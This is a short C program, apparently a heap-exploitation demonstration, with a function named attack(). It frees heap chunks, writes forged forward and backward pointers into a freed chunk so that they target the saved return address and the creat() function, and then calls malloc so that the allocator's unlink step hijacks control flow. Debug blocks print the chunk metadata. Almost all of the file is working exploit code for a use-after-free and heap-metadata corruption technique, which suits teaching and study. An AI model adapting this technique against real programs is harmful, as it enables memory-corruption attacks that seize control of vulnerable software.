#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//#define DEBUG

#define FRAME_PTR __builtin_frame_address(0)
#define RET_ADDR_PTR ((void*)FRAME_PTR - sizeof(void*))

extern int creat(const char *path, int mode);

int attack() {
    char *buf1, *buf2, *buf3, *buf4, *buf5;

    buf1 = malloc(256);
    buf2 = malloc(256);
    buf3 = malloc(256);
    buf4 = malloc(256);

    free(buf3);

#ifdef DEBUG
    fprintf(stderr, "buf1(%p): prev size %ld, size = %ld, fd = %p, bk = %p\n",
            buf1,
            *(size_t*)(buf1 - 16), *(size_t*)(buf1 - 8),
            *(void **)(buf1), *(void **)(buf1 + 8));

    fprintf(stderr, "buf2(%p): prev size 0x%lx, size = 0x%lx, fd = %p, bk = %p\n",
            buf2,
            *(size_t*)(buf2 - 16), *(size_t*)(buf2 - 8),
            *(void **)(buf2), *(void **)(buf2 + 8));

    fprintf(stderr, "buf3(%p): prev size %ld, size = %ld, fd = %p, bk = %p\n",
            buf3,
            *(size_t*)(buf3 - 16), *(size_t*)(buf3 - 8),
            *(void **)(buf3), *(void **)(buf3 + 8));
#endif

    free(buf1);

#ifdef DEBUG
    fprintf(stderr, "buf1(%p): prev size %ld, size = %ld, fd = %p, bk = %p\n",
            buf1,
            *(size_t*)(buf1 - 16), *(size_t*)(buf1 - 8),
            *(void **)(buf1), *(void **)(buf1 + 8));

    fprintf(stderr, "buf2(%p): prev size 0x%lx, size = 0x%lx, fd = %p, bk = %p\n",
            buf2,
            *(size_t*)(buf2 - 16), *(size_t*)(buf2 - 8),
            *(void **)(buf2), *(void **)(buf2 + 8));

    fprintf(stderr, "buf3(%p): prev size %ld, size = %ld, fd = %p, bk = %p\n",
            buf3,
            *(size_t*)(buf3 - 16), *(size_t*)(buf3 - 8),
            *(void **)(buf3), *(void **)(buf3 + 8));
#endif

    *(void **)(buf3) = RET_ADDR_PTR - 24;
    *(void **)(buf3 + 8) = creat;

#ifdef DEBUG
    fprintf(stderr, "buf3(%p): prev size 0x%lx, size = 0x%lx, fd = %p, bk = %p\n",
            buf1,
            *(size_t*)(buf3 - 16), *(size_t*)(buf3 - 8),
            *(void **)(buf3), *(void **)(buf3 + 8));
#endif

    buf5 = malloc(256);

#ifdef DEBUG
    fprintf(stderr, "buf5 = %p\n", buf5);
#endif

    return 0;
}

int main() {
    attack();
    fprintf(stderr, "attack failed\n");

    return 0;
}
